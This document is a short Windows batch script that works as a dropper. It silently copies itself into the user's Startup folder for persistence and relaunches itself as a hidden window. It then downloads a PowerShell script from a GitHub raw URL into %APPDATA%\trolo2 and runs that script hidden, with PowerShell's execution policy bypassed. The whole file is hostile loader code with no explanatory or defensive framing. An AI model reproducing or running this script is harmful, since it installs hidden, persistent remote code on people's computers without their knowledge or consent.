@echo off
setlocal
set "scriptPath=%~dpnx0"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "PS_SCRIPT_PATH=%APPDATA%\trolo2\trolo2.ps1"

:: copy to startup silently
copy "%scriptPath%" "%startupFolder%" >nul 2>nul

:: spawn hidden headless instance if not already
if "%~1" neq "headless" (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'headless' -WindowStyle Hidden"
    exit /b
)

:headless
:: make folder and download PS script
powershell -Command "New-Item -ItemType Directory -Force -Path $env:APPDATA\trolo2; Invoke-WebRequest 'https://raw.githubusercontent.com/realirist/trolo.ps1/main/trolo2.ps1' -OutFile $env:APPDATA\trolo2\trolo2.ps1" 2>nul

:: run the downloaded PS script hidden
if exist "%PS_SCRIPT_PATH%" powershell -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File ""%PS_SCRIPT_PATH%""' -WindowStyle Hidden"

exit /b
